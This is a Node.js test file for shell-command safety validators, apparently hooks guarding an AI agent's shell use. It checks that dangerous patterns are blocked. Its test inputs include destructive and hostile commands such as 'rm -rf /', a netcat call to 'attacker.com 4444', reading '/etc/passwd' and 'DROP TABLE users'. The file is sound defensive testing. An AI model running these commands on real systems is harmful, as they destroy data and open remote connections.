'use strict';

const { describe, test } = require('node:test');
const assert = require('node:assert');

const {
  SHELL_INTERPRETERS,
  DANGEROUS_PATTERNS,
  checkDangerousPatterns,
  extractCArgument,
  extractCArgumentLegacy,
  validateShellCommand,
  validateBashCommand,
  validateShCommand,
  validateZshCommand,
  parseCommand,
  parseCommandLegacy,
} = require('../../.claude/hooks/safety/validators/shell-validators.cjs');
const { DANGEROUS_PATTERN_CASES } = require('../helpers/shell-validator-cases.cjs');

describe('shell-validators', () => {
  describe('SHELL_INTERPRETERS', () => {
    test('includes bash', () => {
      assert.ok(SHELL_INTERPRETERS.has('bash'));
    });

    test('includes sh', () => {
      assert.ok(SHELL_INTERPRETERS.has('sh'));
    });

    test('includes zsh', () => {
      assert.ok(SHELL_INTERPRETERS.has('zsh'));
    });
  });

  describe('DANGEROUS_PATTERNS', () => {
    for (const tc of DANGEROUS_PATTERN_CASES) {
      test(`includes ${tc.name} pattern`, () => {
        const pattern = DANGEROUS_PATTERNS.find(p => p.name === tc.name);
        assert.ok(pattern, `${tc.name} pattern should exist`);
        if (tc.match) {
          assert.ok(pattern.pattern.test(tc.match), tc.message);
        }
        if (tc.matchMany) {
          tc.matchMany.forEach((candidate, index) => {
            assert.ok(pattern.pattern.test(candidate), tc.messageMany[index]);
          });
        }
      });
    }

    test('command substitution pattern does not match arithmetic expansion', () => {
      const pattern = DANGEROUS_PATTERNS.find(p => p.name === 'Command substitution');
      assert.ok(pattern, 'Command substitution pattern should exist');
      assert.ok(pattern.pattern.test('$(whoami)'), 'Pattern should match $(...)');
      assert.strictEqual(
        pattern.pattern.test('$((1+2))'),
        false,
        'Pattern should NOT match $((...))'
      );
    });
  });

  describe('checkDangerousPatterns (SEC-AUDIT-012)', () => {
    test('allows safe commands', () => {
      const result = checkDangerousPatterns('ls -la');
      assert.strictEqual(result.valid, true);
      assert.strictEqual(result.error, '');
    });

    test('blocks ANSI-C quoting', () => {
      const result = checkDangerousPatterns("bash -c $'rm\\x20-rf\\x20/'");
      assert.strictEqual(result.valid, false);
      assert.ok(result.error.includes('SEC-AUDIT-012'));
      assert.ok(result.error.includes('ANSI-C quoting'));
    });

    test('blocks backtick command substitution', () => {
      const result = checkDangerousPatterns('echo `whoami`');
      assert.strictEqual(result.valid, false);
      assert.ok(result.error.includes('SEC-AUDIT-012'));
      assert.ok(result.error.includes('Backtick command substitution'));
    });

    test('blocks $() command substitution', () => {
      const result = checkDangerousPatterns('echo $(id)');
      assert.strictEqual(result.valid, false);
      assert.ok(result.error.includes('SEC-AUDIT-012'));
      assert.ok(result.error.includes('Command substitution'));
    });

    test('blocks here-documents', () => {
      const result = checkDangerousPatterns('cat <<EOF');
      assert.strictEqual(result.valid, false);
      assert.ok(result.error.includes('SEC-AUDIT-012'));
      assert.ok(result.error.includes('Here-document'));
    });

    test('blocks here-documents with dash', () => {
      const result = checkDangerousPatterns('cat <<-EOF');
      assert.strictEqual(result.valid, false);
      assert.ok(result.error.includes('Here-document'));
    });

    test('blocks brace expansion with commas', () => {
      const result = checkDangerousPatterns('rm file{1,2,3}');
      assert.strictEqual(result.valid, false);
      assert.ok(result.error.includes('SEC-AUDIT-012'));
      assert.ok(result.error.includes('Brace expansion'));
    });

    test('handles null input', () => {
      const result = checkDangerousPatterns(null);
      assert.strictEqual(result.valid, true);
    });

    test('handles undefined input', () => {
      const result = checkDangerousPatterns(undefined);
      assert.strictEqual(result.valid, true);
    });

    test('handles empty string', () => {
      const result = checkDangerousPatterns('');
      assert.strictEqual(result.valid, true);
    });

    test('handles non-string input', () => {
      const result = checkDangerousPatterns(123);
      assert.strictEqual(result.valid, true);
    });

    // SEC-AUDIT-012: Here-string blocking
    test('blocks here-strings', () => {
      const result = checkDangerousPatterns('cat <<<input');
      assert.strictEqual(result.valid, false);
      assert.ok(result.error.includes('SEC-AUDIT-012'));
      assert.ok(result.error.includes('Here-string'));
    });

    test('blocks here-strings without space', () => {
      const result = checkDangerousPatterns('bash<<<"rm -rf /"');
      assert.strictEqual(result.valid, false);
      assert.ok(result.error.includes('Here-string'));
    });

    // SEC-AUDIT-012: Dangerous builtins
    test('blocks eval command at start', () => {
      const result = checkDangerousPatterns('eval "$COMMAND"');
      assert.strictEqual(result.valid, false);
      assert.ok(result.error.includes('SEC-AUDIT-012'));
      assert.ok(result.error.includes('eval'));
    });

    test('blocks eval command after semicolon', () => {
      const result = checkDangerousPatterns('echo test; eval bad');
      assert.strictEqual(result.valid, false);
      assert.ok(result.error.includes('eval'));
    });

    test('blocks eval command after pipe', () => {
      const result = checkDangerousPatterns('cmd | eval dangerous');
      assert.strictEqual(result.valid, false);
      assert.ok(result.error.includes('eval'));
    });

    test('allows evaluate (word containing eval)', () => {
      const result = checkDangerousPatterns('evaluate this');
      assert.strictEqual(result.valid, true);
    });

    test('blocks source command', () => {
      const result = checkDangerousPatterns('source ~/.bashrc');
      assert.strictEqual(result.valid, false);
      assert.ok(result.error.includes('SEC-AUDIT-012'));
      assert.ok(result.error.includes('source'));
    });

    test('blocks source after &&', () => {
      const result = checkDangerousPatterns('echo test && source evil.sh');
      assert.strictEqual(result.valid, false);
      assert.ok(result.error.includes('source'));
    });

    test('allows source in quoted string', () => {
      const result = checkDangerousPatterns('echo "source is a word"');
      assert.strictEqual(result.valid, true);
    });

    test('blocks dot command at start', () => {
      const result = checkDangerousPatterns('. /etc/profile');
      assert.strictEqual(result.valid, false);
      assert.ok(result.error.includes('SEC-AUDIT-012'));
      assert.ok(result.error.includes('dot'));
    });

    test('blocks dot command after ||', () => {
      const result = checkDangerousPatterns('false || . script.sh');
      assert.strictEqual(result.valid, false);
      assert.ok(
        result.error.includes('dot') || result.error.includes('OR command chaining'),
        `unexpected error message: ${result.error}`
      );
    });

    test('allows relative path ./script.sh', () => {
      const result = checkDangerousPatterns('./script.sh');
      assert.strictEqual(result.valid, true);
    });

    test('allows parent path ../script.sh', () => {
      const result = checkDangerousPatterns('../script.sh');
      assert.strictEqual(result.valid, true);
    });

    // SEC-AUDIT-012: Arithmetic expansion (should be allowed)
    test('allows arithmetic expansion $((...))', () => {
      const result = checkDangerousPatterns('echo $((1+2))');
      assert.strictEqual(result.valid, true);
    });

    test('allows arithmetic expansion with variables', () => {
      const result = checkDangerousPatterns('echo $(($a + $b))');
      assert.strictEqual(result.valid, true);
    });

    test('allows complex arithmetic expansion', () => {
      const result = checkDangerousPatterns('total=$((count * price))');
      assert.strictEqual(result.valid, true);
    });
  });

  describe('parseCommand', () => {
    test('parses simple command and returns object', () => {
      const result = parseCommand('echo hello', { skipDangerousCheck: true });
      assert.deepStrictEqual(result.tokens, ['echo', 'hello']);
      assert.strictEqual(result.error, null);
    });

    test('handles double quotes', () => {
      const result = parseCommand('echo "hello world"', { skipDangerousCheck: true });
      assert.deepStrictEqual(result.tokens, ['echo', 'hello world']);
    });

    test('returns null tokens for unclosed double quote', () => {
      const result = parseCommand('echo "unclosed', { skipDangerousCheck: true });
      assert.strictEqual(result.tokens, null);
      assert.strictEqual(result.error, null);
    });

    test('handles empty string', () => {
      const result = parseCommand('', { skipDangerousCheck: true });
      assert.deepStrictEqual(result.tokens, []);
    });

    test('handles multiple spaces', () => {
      const result = parseCommand('cmd   arg1    arg2', { skipDangerousCheck: true });
      assert.deepStrictEqual(result.tokens, ['cmd', 'arg1', 'arg2']);
    });

    test('blocks dangerous patterns by default', () => {
      const result = parseCommand('echo `whoami`');
      assert.strictEqual(result.tokens, null);
      assert.ok(result.error.includes('SEC-AUDIT-012'));
    });

    test('allows dangerous patterns when skipDangerousCheck=true', () => {
      const result = parseCommand('echo `whoami`', { skipDangerousCheck: true });
      assert.deepStrictEqual(result.tokens, ['echo', '`whoami`']);
    });
  });

  describe('parseCommandLegacy', () => {
    test('returns just tokens for backward compatibility', () => {
      const tokens = parseCommandLegacy('echo hello');
      assert.deepStrictEqual(tokens, ['echo', 'hello']);
    });

    test('returns null for unclosed quote', () => {
      const tokens = parseCommandLegacy('echo "unclosed');
      assert.strictEqual(tokens, null);
    });

    test('skips dangerous check (legacy behavior)', () => {
      const tokens = parseCommandLegacy('echo `whoami`');
      assert.deepStrictEqual(tokens, ['echo', '`whoami`']);
    });
  });

  describe('extractCArgument', () => {
    test('extracts command from sh -c', () => {
      const result = extractCArgument('sh -c "npm test"');
      assert.strictEqual(result.command, 'npm test');
      assert.strictEqual(result.error, null);
    });

    test('handles combined flags like -xc', () => {
      const result = extractCArgument('bash -xc "echo debug"');
      assert.strictEqual(result.command, 'echo debug');
    });

    test('returns null command for non -c invocation', () => {
      const result = extractCArgument('bash script.sh');
      assert.strictEqual(result.command, null);
      assert.strictEqual(result.error, null);
    });

    test('returns null command for simple bash', () => {
      const result = extractCArgument('bash');
      assert.strictEqual(result.command, null);
    });

    test('returns null command when -c has no argument', () => {
      const result = extractCArgument('bash -c');
      assert.strictEqual(result.command, null);
    });
  });

  describe('extractCArgumentLegacy', () => {
    test('returns just command for backward compatibility', () => {
      const cmd = extractCArgumentLegacy('sh -c "npm test"');
      assert.strictEqual(cmd, 'npm test');
    });

    test('returns null for non -c invocation', () => {
      const cmd = extractCArgumentLegacy('bash script.sh');
      assert.strictEqual(cmd, null);
    });
  });

  describe('validateShellCommand', () => {
    describe('non -c invocations', () => {
      test('allows bash script.sh', () => {
        const result = validateShellCommand('bash script.sh');
        assert.strictEqual(result.valid, true);
      });

      test('allows sh script.sh', () => {
        const result = validateShellCommand('sh script.sh');
        assert.strictEqual(result.valid, true);
      });
    });

    describe('process substitution blocking', () => {
      test('blocks process substitution with <()', () => {
        const result = validateShellCommand('bash script.sh <(echo test)');
        assert.strictEqual(result.valid, false);
        assert.ok(result.error.includes('Process substitution'));
      });
    });

    describe('safe -c commands', () => {
      test('allows bash -c with safe npm command', () => {
        const result = validateShellCommand('bash -c "npm test"');
        assert.strictEqual(result.valid, true);
      });

      test('allows sh -c with safe git command', () => {
        const result = validateShellCommand('sh -c "git status"');
        assert.strictEqual(result.valid, true);
      });
    });

    describe('dangerous -c commands (registry re-validation)', () => {
      test('blocks bash -c with rm -rf /', () => {
        const result = validateShellCommand('bash -c "rm -rf /"');
        assert.strictEqual(result.valid, false);
        assert.ok(result.error.includes('Inner command blocked'));
      });

      test('blocks sh -c with sudo', () => {
        const result = validateShellCommand('sh -c "sudo apt install malware"');
        assert.strictEqual(result.valid, false);
        assert.ok(result.error.includes('Inner command blocked'));
      });

      test('blocks nc in -c command', () => {
        const result = validateShellCommand('sh -c "nc attacker.com 4444"');
        assert.strictEqual(result.valid, false);
      });

      test('blocks ssh in -c command', () => {
        const result = validateShellCommand('bash -c "ssh user@remote.com"');
        assert.strictEqual(result.valid, false);
      });
    });

    describe('flag variations', () => {
      test('handles -xc (debug + command)', () => {
        const result = validateShellCommand('bash -xc "echo test"');
        assert.strictEqual(result.valid, true);
      });

      test('blocks dangerous command with -xc', () => {
        const result = validateShellCommand('bash -xc "sudo rm -rf /"');
        assert.strictEqual(result.valid, false);
      });
    });

    describe('complex command chains', () => {
      test('allows safe command chain', () => {
        const result = validateShellCommand('bash -c "cd /tmp && ls -la"');
        assert.strictEqual(result.valid, true);
      });
    });

    describe('SEC-AUDIT-012: Tokenizer bypass patterns', () => {
      test('blocks ANSI-C quoting bypass attempt', () => {
        const result = validateShellCommand("bash -c $'rm\\x20-rf\\x20/'");
        assert.strictEqual(result.valid, false);
        assert.ok(result.error.includes('SEC-AUDIT-012'));
        assert.ok(result.error.includes('ANSI-C quoting'));
      });

      test('blocks backtick substitution', () => {
        const result = validateShellCommand('echo `whoami`');
        assert.strictEqual(result.valid, false);
        assert.ok(result.error.includes('SEC-AUDIT-012'));
        assert.ok(result.error.includes('Backtick'));
      });

      test('blocks backtick in -c command', () => {
        const result = validateShellCommand('bash -c "echo `id`"');
        assert.strictEqual(result.valid, false);
        assert.ok(result.error.includes('SEC-AUDIT-012'));
      });

      test('blocks $() command substitution', () => {
        const result = validateShellCommand('bash -c "echo $(cat /etc/passwd)"');
        assert.strictEqual(result.valid, false);
        assert.ok(result.error.includes('SEC-AUDIT-012'));
      });

      test('blocks here-document', () => {
        const result = validateShellCommand('cat <<EOF');
        assert.strictEqual(result.valid, false);
        assert.ok(result.error.includes('SEC-AUDIT-012'));
        assert.ok(result.error.includes('Here-document'));
      });

      test('blocks here-document in -c command', () => {
        const result = validateShellCommand('bash -c "cat <<EOF"');
        assert.strictEqual(result.valid, false);
        assert.ok(result.error.includes('SEC-AUDIT-012'));
      });

      test('blocks dangerous brace expansion', () => {
        const result = validateShellCommand('rm -rf /tmp/{a,b,c}');
        assert.strictEqual(result.valid, false);
        assert.ok(result.error.includes('SEC-AUDIT-012'));
        assert.ok(result.error.includes('Brace expansion'));
      });

      test('allows safe commands without dangerous patterns', () => {
        const result = validateShellCommand('ls -la');
        assert.strictEqual(result.valid, true);
      });

      test('allows safe commands with simple braces (no comma)', () => {
        // Single brace without comma is not brace expansion
        const result = validateShellCommand('echo {hello}');
        assert.strictEqual(result.valid, true);
      });
    });

    describe('SEC-AUDIT-012: Inner command pattern detection', () => {
      test('blocks inner command with backticks', () => {
        const result = validateShellCommand('sh -c "`rm -rf /`"');
        assert.strictEqual(result.valid, false);
        assert.ok(result.error.includes('SEC-AUDIT-012'));
      });

      test('blocks inner command with command substitution', () => {
        const result = validateShellCommand('sh -c "$(malicious_cmd)"');
        assert.strictEqual(result.valid, false);
        assert.ok(result.error.includes('SEC-AUDIT-012'));
      });

      test('blocks inner command with ANSI-C quoting', () => {
        const result = validateShellCommand("sh -c $'echo\\x00evil'");
        assert.strictEqual(result.valid, false);
        assert.ok(result.error.includes('SEC-AUDIT-012'));
      });
    });

    describe('SEC-AUDIT-012: Here-string blocking', () => {
      test('blocks here-string with dangerous input', () => {
        const result = validateShellCommand('bash <<<"rm -rf /"');
        assert.strictEqual(result.valid, false);
        assert.ok(result.error.includes('SEC-AUDIT-012'));
        assert.ok(result.error.includes('Here-string'));
      });

      test('blocks here-string without space', () => {
        const result = validateShellCommand('mysql<<<"DROP TABLE users"');
        assert.strictEqual(result.valid, false);
        assert.ok(result.error.includes('Here-string'));
      });
    });

    describe('SEC-AUDIT-012: Dangerous builtin blocking', () => {
      test('blocks eval command', () => {
        const result = validateShellCommand('eval "$MALICIOUS"');
        assert.strictEqual(result.valid, false);
        assert.ok(result.error.includes('SEC-AUDIT-012'));
        assert.ok(result.error.includes('eval'));
      });

      test('blocks source command', () => {
        const result = validateShellCommand('source /tmp/evil.sh');
        assert.strictEqual(result.valid, false);
        assert.ok(result.error.includes('SEC-AUDIT-012'));
        assert.ok(result.error.includes('source'));
      });

      test('blocks dot command', () => {
        const result = validateShellCommand('. /tmp/evil.sh');
        assert.strictEqual(result.valid, false);
        assert.ok(result.error.includes('SEC-AUDIT-012'));
        assert.ok(result.error.includes('dot'));
      });

      test('allows legitimate relative paths', () => {
        const result = validateShellCommand('./my-script.sh');
        assert.strictEqual(result.valid, true);
      });

      test('allows parent directory paths', () => {
        const result = validateShellCommand('../scripts/build.sh');
        assert.strictEqual(result.valid, true);
      });
    });

    describe('SEC-AUDIT-012: Arithmetic expansion (false positive fix)', () => {
      test('allows simple arithmetic expansion', () => {
        const result = validateShellCommand('echo $((1+2))');
        assert.strictEqual(result.valid, true);
      });

      test('allows arithmetic expansion with variables', () => {
        const result = validateShellCommand('result=$((count * 10))');
        assert.strictEqual(result.valid, true);
      });

      test('allows nested arithmetic expansion', () => {
        // $(($(($a)) + 1)) is valid shell arithmetic (nested arithmetic expansions)
        // The inner $(($a)) is arithmetic, not command substitution
        const result = validateShellCommand('echo $(($(($a)) + 1))');
        assert.strictEqual(result.valid, true);
      });

      test('still blocks command substitution', () => {
        const result = validateShellCommand('echo $(whoami)');
        assert.strictEqual(result.valid, false);
        assert.ok(result.error.includes('Command substitution'));
      });
    });
  });

  describe('alias functions', () => {
    test('validateBashCommand behaves same as validateShellCommand', () => {
      const bashResult = validateBashCommand('bash -c "echo test"');
      const shellResult = validateShellCommand('bash -c "echo test"');
      assert.deepStrictEqual(bashResult, shellResult);
    });

    test('validateShCommand behaves same as validateShellCommand', () => {
      const shResult = validateShCommand('sh -c "npm test"');
      const shellResult = validateShellCommand('sh -c "npm test"');
      assert.deepStrictEqual(shResult, shellResult);
    });

    test('validateZshCommand behaves same as validateShellCommand', () => {
      const zshResult = validateZshCommand('zsh -c "ls"');
      const shellResult = validateShellCommand('zsh -c "ls"');
      assert.deepStrictEqual(zshResult, shellResult);
    });

    test('all aliases block SEC-AUDIT-012 patterns', () => {
      const bashResult = validateBashCommand('echo `whoami`');
      const shResult = validateShCommand('echo `whoami`');
      const zshResult = validateZshCommand('echo `whoami`');

      assert.strictEqual(bashResult.valid, false);
      assert.strictEqual(shResult.valid, false);
      assert.strictEqual(zshResult.valid, false);

      assert.ok(bashResult.error.includes('SEC-AUDIT-012'));
      assert.ok(shResult.error.includes('SEC-AUDIT-012'));
      assert.ok(zshResult.error.includes('SEC-AUDIT-012'));
    });
  });
});
